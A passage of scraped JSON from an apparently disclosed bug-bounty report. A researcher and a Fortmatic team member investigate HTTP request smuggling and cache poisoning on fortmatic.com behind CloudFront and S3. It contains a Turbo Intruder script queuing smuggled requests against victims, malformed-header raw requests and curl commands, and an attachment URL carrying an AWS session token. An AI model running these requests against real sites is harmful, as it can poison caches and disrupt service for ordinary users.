\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-09T13:43:06.279Z","updated_at":"2019-12-09T13:43:06.279Z","actor":{"username":"pwny_sec","cleared":false,"url":"/pwny_sec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NArGP2CY5FG6RbFywHFAjVSk/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"fortmatic_inc","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6503247,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"because the signing doesn't know what to do with the transfer encoding header, it will reflect it back when the next request goes through. I can make a video demonstrating this. the socket is effectively poisoned.  When it reflects the request back it will expose internal configurations.  I have done this for another company they paid out. http smuggling is when you split the request and cause odd behavior, when the backend doesn't know how to handle the request. It can also expose internal working of a site, denial of service etc. \nthis would fall under Web Cache Poisoning.\nIT all as a bonus leaked fortmatic.com hmac signing configuration. ","markdown_message":"\u003cp\u003ebecause the signing doesn\u0026#39;t know what to do with the transfer encoding header, it will reflect it back when the next request goes through. I can make a video demonstrating this. the socket is effectively poisoned.  When it reflects the request back it will expose internal configurations.  I have done this for another company they paid out. http smuggling is when you split the request and cause odd behavior, when the backend doesn\u0026#39;t know how to handle the request. It can also expose internal working of a site, denial of service etc. \u003cbr\u003e\nthis would fall under Web Cache Poisoning.\u003cbr\u003e\nIT all as a bonus leaked fortmatic.com hmac signing configuration. \u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-09T13:45:52.376Z","updated_at":"2019-12-09T13:53:47.315Z","actor":{"username":"pwny_sec","cleared":false,"url":"/pwny_sec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NArGP2CY5FG6RbFywHFAjVSk/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"fortmatic_inc","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6504950,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I can affect anybody loading the webpage, from outside of my ip range. this is affecting normal users. This video covers all the domains thank you","markdown_message":"\u003cp\u003eI can affect anybody loading the webpage, from outside of my ip range. this is affecting normal users. This video covers all the domains thank you\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-09T16:56:50.012Z","updated_at":"2019-12-09T16:57:19.501Z","actor":{"username":"pwny_sec","cleared":false,"url":"/pwny_sec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NArGP2CY5FG6RbFywHFAjVSk/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":654961,"filename":"2019-12-09_11-32-47.mp4","type":"video/mp4","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/GhVU3enK4JqWe4oAJWBkhVCu?response-content-disposition=attachment%3B%20filename%3D%222019-12-09_11-32-47.mp4%22%3B%20filename%2A%3DUTF-8%27%272019-12-09_11-32-47.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYENXQUKC%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T064655Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHXwr%2Bz%2B7j54GXjIZDeFjE7V4KhtcLVpveDKyRp%2FgHMpAiEA%2FzBLaI4tlPUnNvgzY0X8n68OkDDLSfCBmjTZSd2A%2BM8qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDOLyu53NKIhzdiDnLyqRA1YiznmwUquOZL6cfEwHlrCEbfV1uip5mxrCKpzmpc9DKyYejzEqNMg8%2Fo1XQZiQbQ9Mn8QGMjtqUBvpzsRmfLsdw4KO6Yix26%2Foq9H6jcEfUIX3EyFaY0ofGk42HT5lnakJ%2FUAtv5lyqirA3laDcoq6u60WpxBZh0jLi92Ajs9kGkzDbgWJPXMK2%2FlVglZWa%2BjQNhDftrEqJh4ZV%2FIwfbcJ6s89eju9B4Xkun1IUiVjrUtA5LTMlkDAEwqtGdl3pucepUSB2hZBvbqUfgiT65T%2BpLDNg0LFqEXPPPqqyrYG3%2BqTXIZxR1FfbdXOQjx1UoPwboCHOwSOpOKGaPs6TEM2o6Sg2U%2BGvuy3dMdtNBCfH4SIfBdeUa84eWUftCR4OwBiC0F1Cl6iPIZXa92zkJSAVTz9swPvr%2BghYLYGIjX%2F8jqVGlADsLB1sl%2BqlNRFkwYrvTDOWwnYmDuvQmmhpAQ6Mg%2Fp05v07WKHRsbG%2BAUzVJ3M02i0HIdWCGKjqKXgGZi%2FLBrHUEV9bzaVWmpeFEE3MObUqv8FOusBMEus3670kEKa62xVKQkID%2Fav5Xylzf384wPv9i4fBKmwghqKR67wSDPkErUtnTlN6wJNos0uBd5jibop6zjPh%2BDMaeI%2Bt4z0CbNpMS83WKn2xS%2FvSK0QFyg217PkDWCKklNPmbumtDteHdU2qRRX%2BQwVoTBmoRFgs97OyKXEz2rc7ZIcHuDnAibsNVPNZEuX9m%2B04KKBBkwdIr0sY3zEiVHvTVxPYBSsKfBPuZwzi6W3T3aq%2BF9l860FnFBaV964%2BlbASqZkuTd4cEZ8C2GJad6RyY164GfHgpKnmQ6aYbLhiDTz0xF3adlmhg%3D%3D\u0026X-Amz-Signature=3abcf3353043a501077a11402ae9e8f7a1b66c8f6a1a1a86eca69c5cff7a8f61"}],"genius_execution_id":null,"team_handle":"fortmatic_inc","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6517967,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @pwny_sec, thanks for reporting this, were you able to find more ways to exploit this other than returning the 403 page?\n\nAn update on ourside:\n\nWe've done some digging into this, and for context we use AWS CloudFront to serve our content. From my own testing I'm able to verify that when `Transfer-Encoding` and `Content-Length` are both present in the request, cloudfront will strip `content-length` from the request before passing it onto the frontend to serve. Given that CloudFront strips CL, it's my current belief that it should not be possible to actually poison the backend workers (would love to know if you find otherwise!).\n\nAt the moment I'm not quite sure why the malformed ` Transfer-Encoding` header is resulting in a 403, if you've got any ideas on why that is I'd love to know as well.","markdown_message":"\u003cp\u003eHey \u003ca href=\"/pwny_sec\"\u003e@pwny_sec\u003c/a\u003e, thanks for reporting this, were you able to find more ways to exploit this other than returning the 403 page?\u003c/p\u003e\n\n\u003cp\u003eAn update on ourside:\u003c/p\u003e\n\n\u003cp\u003eWe\u0026#39;ve done some digging into this, and for context we use AWS CloudFront to serve our content. From my own testing I\u0026#39;m able to verify that when \u003ccode\u003eTransfer-Encoding\u003c/code\u003e and \u003ccode\u003eContent-Length\u003c/code\u003e are both present in the request, cloudfront will strip \u003ccode\u003econtent-length\u003c/code\u003e from the request before passing it onto the frontend to serve. Given that CloudFront strips CL, it\u0026#39;s my current belief that it should not be possible to actually poison the backend workers (would love to know if you find otherwise!).\u003c/p\u003e\n\n\u003cp\u003eAt the moment I\u0026#39;m not quite sure why the malformed \u003ccode\u003eTransfer-Encoding\u003c/code\u003e header is resulting in a 403, if you\u0026#39;ve got any ideas on why that is I\u0026#39;d love to know as well.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-10T23:40:55.511Z","updated_at":"2019-12-10T23:40:55.511Z","actor":{"username":"d9chen","cleared":false,"url":"/d9chen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"fortmatic_inc","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6522783,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"So, lets explore the cache being poisoned. It is affecting the request when it hit your backend and it doesn't know what to do with the request. Take the below snip and put it into turbo cl:te. I will be testing on x2 because i believe is isn't used for anything. Is a good place to test this out, but it is harder to get the response back on the screen. Click on the status tab so it will sort out status codes. When you refresh the page from any source; a status 200 returns. Reference-image-reflected.png\n\n```\n    prefix = '''GET /hopefully404 HTTP/1.1\nGET /index.html HTTP/1.1\nHost: x2.fortmatic.com\nX-Ignore: X'''\n    for z in range(1000):\n      # The request engine will auto-fix the content-length for us\n      attack = target.req + prefix\n      engine.queue(attack)\n\n      victim = target.req\n      for i in range(3):\n          engine.queue(victim)\n          time.sleep(0.05)\n```\n\nTE:CL doesn't show the reflected page when running Turbo Intruder, but when I ran CL:TE the reflected page shows up in Turbo Intruder as a status 200. CL:TE is much more affective getting consistent reflects. Lets examine CL:TE, it was way easier to poison the cache using this method. Get a consistent return. While testing notice you wont get the 200's until you refresh he page.  It's easier to find on dashboard.fortmatic.com and fortmatic.com I relegated myself to testing in a place I felt wouldn't affect customers. On the other domains it has that desync feel where it alternates between valid response to cached response. \n\n```\nGET /index.html HTTP/1.1\nHost: x2.fortmatic.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nDNT: 1\nConnection: close\nUpgrade-Insecure-Requests: 1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 5\n Transfer-Encoding  :  chunked\n\n0\n\n\n```\n\nTurbo Intruder:\n\n```\n# if you edit this file, ensure you keep the line endings as CRLF or you'll have a bad time\ndef queueRequests(target, wordlists):\n\n    # to use Burp's HTTP stack for upstream proxy rules etc, use engine=Engine.BURP\n    engine = RequestEngine(endpoint=target.endpoint,\n                           concurrentConnections=5,\n                           requestsPerConnection=1,\n                           resumeSSL=False,\n                           timeout=10,\n                           pipeline=False,\n                           maxRetriesPerRequest=0,\n                           engine=Engine.THREADED,\n                           )\n    engine.start()\n\n    # This will prefix the victim's request. Edit it to achieve the desired effect.\n    prefix = '''GET /index.html HTTP/1.1\nHost: x2.fortmatic.com'''\n    for i in range(1000):\n      # The request engine will auto-fix the content-length for us\n      attack = target.req + prefix\n      engine.queue(attack)\n\n      victim = target.req\n      for i in range(3):\n        engine.queue(victim)\n        time.sleep(0.05)\n\n\ndef handleResponse(req, interesting):\n    table.add(req)\n\n\n```\n\nWhy does it respond with a forbidden? I tested this on some cloudfront customers work with hackerone. I tested this on slack they return the 403 but the cache isn't poisoned nor does it return the signing error. I believe there is a error between your backend and cloudfront that is causing the cache to be poisoned. Somewhere between the hmac validation that's causing this error. It does not appear to be cloud-fronts fault.\n\n","markdown_message":"\u003cp\u003eSo, lets explore the cache being poisoned. It is affecting the request when it hit your backend and it doesn\u0026#39;t know what to do with the request. Take the below snip and put it into turbo cl:te. I will be testing on x2 because i believe is isn\u0026#39;t used for anything. Is a good place to test this out, but it is harder to get the response back on the screen. Click on the status tab so it will sort out status codes. When you refresh the page from any source; a status 200 returns. Reference-image-reflected.png\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e    prefix = \u0026#39;\u0026#39;\u0026#39;GET /hopefully404 HTTP/1.1\nGET /index.html HTTP/1.1\nHost: x2.fortmatic.com\nX-Ignore: X\u0026#39;\u0026#39;\u0026#39;\n    for z in range(1000):\n      # The request engine will auto-fix the content-length for us\n      attack = target.req + prefix\n      engine.queue(attack)\n\n      victim = target.req\n      for i in range(3):\n          engine.queue(victim)\n          time.sleep(0.05)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eTE:CL doesn\u0026#39;t show the reflected page when running Turbo Intruder, but when I ran CL:TE the reflected page shows up in Turbo Intruder as a status 200. CL:TE is much more affective getting consistent reflects. Lets examine CL:TE, it was way easier to poison the cache using this method. Get a consistent return. While testing notice you wont get the 200\u0026#39;s until you refresh he page.  It\u0026#39;s easier to find on dashboard.fortmatic.com and fortmatic.com I relegated myself to testing in a place I felt wouldn\u0026#39;t affect customers. On the other domains it has that desync feel where it alternates between valid response to cached response. \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /index.html HTTP/1.1\nHost: x2.fortmatic.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nDNT: 1\nConnection: close\nUpgrade-Insecure-Requests: 1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 5\n Transfer-Encoding  :  chunked\n\n0\n\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eTurbo Intruder:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e# if you edit this file, ensure you keep the line endings as CRLF or you\u0026#39;ll have a bad time\ndef queueRequests(target, wordlists):\n\n    # to use Burp\u0026#39;s HTTP stack for upstream proxy rules etc, use engine=Engine.BURP\n    engine = RequestEngine(endpoint=target.endpoint,\n                           concurrentConnections=5,\n                           requestsPerConnection=1,\n                           resumeSSL=False,\n                           timeout=10,\n                           pipeline=False,\n                           maxRetriesPerRequest=0,\n                           engine=Engine.THREADED,\n                           )\n    engine.start()\n\n    # This will prefix the victim\u0026#39;s request. Edit it to achieve the desired effect.\n    prefix = \u0026#39;\u0026#39;\u0026#39;GET /index.html HTTP/1.1\nHost: x2.fortmatic.com\u0026#39;\u0026#39;\u0026#39;\n    for i in range(1000):\n      # The request engine will auto-fix the content-length for us\n      attack = target.req + prefix\n      engine.queue(attack)\n\n      victim = target.req\n      for i in range(3):\n        engine.queue(victim)\n        time.sleep(0.05)\n\n\ndef handleResponse(req, interesting):\n    table.add(req)\n\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhy does it respond with a forbidden? I tested this on some cloudfront customers work with hackerone. I tested this on slack they return the 403 but the cache isn\u0026#39;t poisoned nor does it return the signing error. I believe there is a error between your backend and cloudfront that is causing the cache to be poisoned. Somewhere between the hmac validation that\u0026#39;s causing this error. It does not appear to be cloud-fronts fault.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-11T12:42:31.377Z","updated_at":"2019-12-11T12:44:11.900Z","actor":{"username":"pwny_sec","cleared":false,"url":"/pwny_sec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NArGP2CY5FG6RbFywHFAjVSk/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"fortmatic_inc","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6522795,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Remember the zero is a `content-length` its telling the request length is zero so that essentially a second request. I believe the back-end doesn't know what to do with the malformed request and poisons the cache","markdown_message":"\u003cp\u003eRemember the zero is a \u003ccode\u003econtent-length\u003c/code\u003e its telling the request length is zero so that essentially a second request. I believe the back-end doesn\u0026#39;t know what to do with the malformed request and poisons the cache\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-11T12:46:22.718Z","updated_at":"2019-12-11T12:54:05.374Z","actor":{"username":"pwny_sec","cleared":false,"url":"/pwny_sec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NArGP2CY5FG6RbFywHFAjVSk/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"fortmatic_inc","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6527459,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\u003e Why does it respond with a forbidden? I tested this on some cloudfront customers work with hackerone. I tested this on slack they return the 403 but the cache isn't poisoned nor does it return the signing error. I believe there is a error between your backend and cloudfront that is causing the cache to be poisoned. Somewhere between the hmac validation that's causing this error. It does not appear to be cloud-fronts fault.\n\nThis bit got me thinking some more, and I experimented a bit more with the requests. For some additional context we use [CloudFront as an origin for accessing static content on S3](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/private-content-restricting-access-to-s3.html). \n\nAs a result it would seem based on experimental results that CloudFront is generating signatures based on certain aspects of the request (headers, query strings, etc) and passing that onto S3 as part of the request. S3 on it's end will calculate it's own signature based on the same parameters, and try to verify the received signature against the one it calculated to verify whether or not it should serve the request. In the event that it determines that the signatures do not match it will return a 403. \n\nThe `Content-Length` and `Transfer-Encoding` headers are used as part of the signature calculations, see [aws reference doc](https://docs.aws.amazon.com/AmazonS3/latest/API/sigv4-streaming.html). \n\nMy current working theory is that CloudFront does not normalize the `Transfer-Encoding` and `Content-Length` headers prior to calculating the signature, as a result the extra whitespaces are incorporated into the calculated signature. However, when the request is received by S3, it will normalize the headers prior to calculating the signature. As a result this results in the signature mismatch, which leads to the 403.\n\nTo verify we can try some fairly simple cURLs to get 403s from CloudFront:\nMalformed content-length header:\n```\ncurl -i -s -k  -X $'GET' \\\n    -H $'Host: dashboard.fortmatic.com' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: https://dashboard.fortmatic.com/' -H $'DNT: 1' -H $'Connection: keep-alive' -H $'Upgrade-Insecure-Requests: 1' -H $'If-Modified-Since: Sat, 07 Dec 2019 02:01:47 GMT' -H $'Cache-Control: max-age=0' -H $'Content-Type: application/x-www-form-urlencoded' -H $'   Content-Length: 3' \\\n    -b $'ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id=%2217057bde-1957-4ee5-ab69-48f049e806f1%22' \\\n    --data-binary $'\\x0d\\x0a\\x0d\\x0a0' --http1.1 \\\n    $'https://dashboard.fortmatic.com/login'\n```\n\nMalformed transfer-encoding header:\n```\ncurl -i -s -k  -X $'GET' \\\n    -H $'Host: dashboard.fortmatic.com' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: https://dashboard.fortmatic.com/' -H $'DNT: 1' -H $'Connection: keep-alive' -H $'Upgrade-Insecure-Requests: 1' -H $'If-Modified-Since: Sat, 07 Dec 2019 02:01:47 GMT' -H $'Cache-Control: max-age=0' -H $'Content-Type: application/x-www-form-urlencoded' -H ' Transfer-Encoding: chunked'\\\n    -b $'ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id=%2217057bde-1957-4ee5-ab69-48f049e806f1%22' \\\n    --data-binary $'\\x0d\\x0a\\x0d\\x0a0' --http1.1 \\\n    $'https://dashboard.fortmatic.com/login'\n```\n\nIt's unclear to me at the moment if the 200s received by turbo intruder are by chance the cached content on CloudFront, or vice versa the 403s returned from a request in the browser is cached content from the mismatched signature response generated by turbo intruder. ","markdown_message":"\u003cblockquote\u003e\n\u003cp\u003eWhy does it respond with a forbidden? I tested this on some cloudfront customers work with hackerone. I tested this on slack they return the 403 but the cache isn\u0026#39;t poisoned nor does it return the signing error. I believe there is a error between your backend and cloudfront that is causing the cache to be poisoned. Somewhere between the hmac validation that\u0026#39;s causing this error. It does not appear to be cloud-fronts fault.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eThis bit got me thinking some more, and I experimented a bit more with the requests. For some additional context we use \u003ca href=\"/redirect?url=https%3A%2F%2Fdocs.aws.amazon.com%2FAmazonCloudFront%2Flatest%2FDeveloperGuide%2Fprivate-content-restricting-access-to-s3.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eCloudFront as an origin for accessing static content on S3\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. \u003c/p\u003e\n\n\u003cp\u003eAs a result it would seem based on experimental results that CloudFront is generating signatures based on certain aspects of the request (headers, query strings, etc) and passing that onto S3 as part of the request. S3 on it\u0026#39;s end will calculate it\u0026#39;s own signature based on the same parameters, and try to verify the received signature against the one it calculated to verify whether or not it should serve the request. In the event that it determines that the signatures do not match it will return a 403. \u003c/p\u003e\n\n\u003cp\u003eThe \u003ccode\u003eContent-Length\u003c/code\u003e and \u003ccode\u003eTransfer-Encoding\u003c/code\u003e headers are used as part of the signature calculations, see \u003ca href=\"/redirect?url=https%3A%2F%2Fdocs.aws.amazon.com%2FAmazonS3%2Flatest%2FAPI%2Fsigv4-streaming.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eaws reference doc\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. \u003c/p\u003e\n\n\u003cp\u003eMy current working theory is that CloudFront does not normalize the \u003ccode\u003eTransfer-Encoding\u003c/code\u003e and \u003ccode\u003eContent-Length\u003c/code\u003e headers prior to calculating the signature, as a result the extra whitespaces are incorporated into the calculated signature. However, when the request is received by S3, it will normalize the headers prior to calculating the signature. As a result this results in the signature mismatch, which leads to the 403.\u003c/p\u003e\n\n\u003cp\u003eTo verify we can try some fairly simple cURLs to get 403s from CloudFront:\u003cbr\u003e\nMalformed content-length header:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecurl -i -s -k  -X $\u0026#39;GET\u0026#39; \\\n    -H $\u0026#39;Host: dashboard.fortmatic.com\u0026#39; -H $\u0026#39;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\u0026#39; -H $\u0026#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\u0026#39; -H $\u0026#39;Accept-Language: en-US,en;q=0.5\u0026#39; -H $\u0026#39;Accept-Encoding: gzip, deflate\u0026#39; -H $\u0026#39;Referer: https://dashboard.fortmatic.com/\u0026#39; -H $\u0026#39;DNT: 1\u0026#39; -H $\u0026#39;Connection: keep-alive\u0026#39; -H $\u0026#39;Upgrade-Insecure-Requests: 1\u0026#39; -H $\u0026#39;If-Modified-Since: Sat, 07 Dec 2019 02:01:47 GMT\u0026#39; -H $\u0026#39;Cache-Control: max-age=0\u0026#39; -H $\u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39; -H $\u0026#39;   Content-Length: 3\u0026#39; \\\n    -b $\u0026#39;ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id=%2217057bde-1957-4ee5-ab69-48f049e806f1%22\u0026#39; \\\n    --data-binary $\u0026#39;\\x0d\\x0a\\x0d\\x0a0\u0026#39; --http1.1 \\\n    $\u0026#39;https://dashboard.fortmatic.com/login\u0026#39;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eMalformed transfer-encoding header:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecurl -i -s -k  -X $\u0026#39;GET\u0026#39; \\\n    -H $\u0026#39;Host: dashboard.fortmatic.com\u0026#39; -H $\u0026#39;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\u0026#39; -H $\u0026#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\u0026#39; -H $\u0026#39;Accept-Language: en-US,en;q=0.5\u0026#39; -H $\u0026#39;Accept-Encoding: gzip, deflate\u0026#39; -H $\u0026#39;Referer: https://dashboard.fortmatic.com/\u0026#39; -H $\u0026#39;DNT: 1\u0026#39; -H $\u0026#39;Connection: keep-alive\u0026#39; -H $\u0026#39;Upgrade-Insecure-Requests: 1\u0026#39; -H $\u0026#39;If-Modified-Since: Sat, 07 Dec 2019 02:01:47 GMT\u0026#39; -H $\u0026#39;Cache-Control: max-age=0\u0026#39; -H $\u0026#39;Content-Type: application/x-www-form-urlencoded\u0026#39; -H \u0026#39; Transfer-Encoding: chunked\u0026#39;\\\n    -b $\u0026#39;ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id=%2217057bde-1957-4ee5-ab69-48f049e806f1%22\u0026#39; \\\n    --data-binary $\u0026#39;\\x0d\\x0a\\x0d\\x0a0\u0026#39; --http1.1 \\\n    $\u0026#39;https://dashboard.fortmatic.com/login\u0026#39;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIt\u0026#39;s unclear to me at the moment if the 200s received by turbo intruder are by chance the cached content on CloudFront, or vice versa the 403s returned from a request in the browser is cached content from the mismatched signature response generated by turbo intruder. \u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-12T00:01:30.074Z","updated_at":"2019-12-12T00:01:30.074Z","actor":{"username":"d9chen","cleared":false,"url":"/d9chen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"fortmatic_inc","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6534597,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Lets investigate this more, it is pretty interesting that it also response to the malformed `content-length` header. It seems to behave the same way as with the `Transfer-Encoding` header. This is highly odd behavior. \nLets go into some of the odd behavior here with a malformed `content-length` . There are some very interesting responses here, depending on the request sent. \n\nFirst i made a video below demoing all of this. We will examine a handful of request, lets answer the Turbo intruder question. The reflected request has a timing of zero, there is no delayed feedback. These request have a delayed feedback, i have had that problem before. Edit `requestsPerConnection` to the value 2 or great to see this affect. I would like to references the video i made demoing this. the browser i pulled up was out side of the kali. turbo intruder can't affect the browser just its self. When turbo intruder errors out the time is zero. \n\nNow to the request, I will start from a basic request with nothing then build up from that. \n\n```\nGET / HTTP/1.1\nHost: dashboard.fortmatic.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://dashboard.fortmatic.com/\nDNT: 1\nConnection: close\nCookie: *\nUpgrade-Insecure-Requests: 1\nIf-Modified-Since: Sat, 07 Dec 2019 02:01:47 GMT\nContent-Type: application/x-www-form-urlencoded\n Content-Length: 0\n\n\n```\n\nResponses View image responses1.png, first thing i noticed here was the that the resposnes had the `Transfer-Encoding` header, the nexxt thing was `X-Cache: Hit from Cloudfront` . So we have a cached response and the response includes `Transfer-Encoding` header I believe should be there.  I edited out some junk from the response.\n\n```\nHTTP/1.1 403 Forbidden\nContent-Type: application/xml\nTransfer-Encoding: chunked\nConnection: keep-alive\nDate: Thu, 12 Dec 2019 13:32:10 GMT\nServer: AmazonS3\nStrict-Transport-Security: max-age=63072000; includeSubdomains; preload\nContent-Security-Policy: default-src\nX-Content-Type-Options: nosniff\nX-Frame-Options: SAMEORIGIN\nX-XSS-Protection: 1; mode=block\nReferrer-Policy: strict-origin-when-cross-origin\nX-Cache: Hit from cloudfront\nVia: 1.1 81967fd0988948662c44f29b5412bafe.cloudfront.net (CloudFront)\nX-Amz-Cf-Pop: ATL50-C1\nX-Amz-Cf-Id: tGn5gspr_AeecYCTjDebRhS7kAWIHEW2kFyBIrPwe3eV_xyFTxTAVA==\n```\n\nFor the next request lets add something to the body of the request placing a non hex character for example `G` in the body returns the same of as above. Now add a `0` to start a new request and a `F`. This was when it got weird, The response returned a split request. Two responses in one request. The cache returned a error `X-Cache: RefreshHit from cloudfront` and the `Transfer-Encoding` header is gone as well. Doing this test i was able to get 200 response and 304 response codes the picture only has the 304 and 403. \n\n**REQUEST:**\n\n```\nGET / HTTP/1.1\nHost: dashboard.fortmatic.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://dashboard.fortmatic.com/\nDNT: 1\nConnection: keep-alive\nCookie: *\nUpgrade-Insecure-Requests: 1\nIf-Modified-Since: Sat, 07 Dec 2019 02:01:47 GMT\nContent-Type: application/x-www-form-urlencoded\n Content-Length: 6\n\n0\n\nF\n```\n\n**RESPONSE**\n\n```\nHTTP/1.1 304 Not Modified\nConnection: keep-alive\nDate: Thu, 12 Dec 2019 13:41:29 GMT\nLast-Modified: Sat, 07 Dec 2019 02:01:47 GMT\nETag: \"5df631e1fe4774958c055af2066d43ec\"\nServer: AmazonS3\nStrict-Transport-Security: max-age=63072000; includeSubdomains; preload\nContent-Security-Policy: default-src 'self';style-src 'self' 'unsafe-inline'; frame-src https://*.fortmatic.com/ https://fortmatic.github.io/ blob: https://x2.fortmatic.com; img-src 'self' https://*.fortmatic.com/ https://fortmatic.github.io/ 